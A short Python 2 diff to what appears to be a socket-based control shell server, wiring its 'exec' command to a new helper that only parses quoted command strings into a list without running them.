@@ -30,7 +30,7 @@ def ctrl_shell_server(s, PORT):
                 print 'commands:\n  exec'
             elif inp.startswith('exec'):
                 if re.search('^exec (".+"\ )+$', inp + ' '):
-                    print 'execing'
+                    ctrl_shell_exec(inp)
                 else:
                     print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
             else:
@@ -39,6 +39,24 @@ def ctrl_shell_server(s, PORT):
             break
     conn.close()
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
+
+
+def ctrl_shell_exec(inp):
+    cmds = parse_inp_cmds(inp)
+
+
+def parse_inp_cmds(inp):
+    cmds = []
+    inp = inp[5:]
+    num_cmds = len(re.findall('"', inp)) / 2
+    for i in range(num_cmds):
+        first = inp.find('"')
+        second = inp.find('"', first+1)
+        cmd = inp[first+1:second]
+        cmds.append(cmd)
+        inp = inp[second+2:]
+    return cmds
+
 
 
 def main():
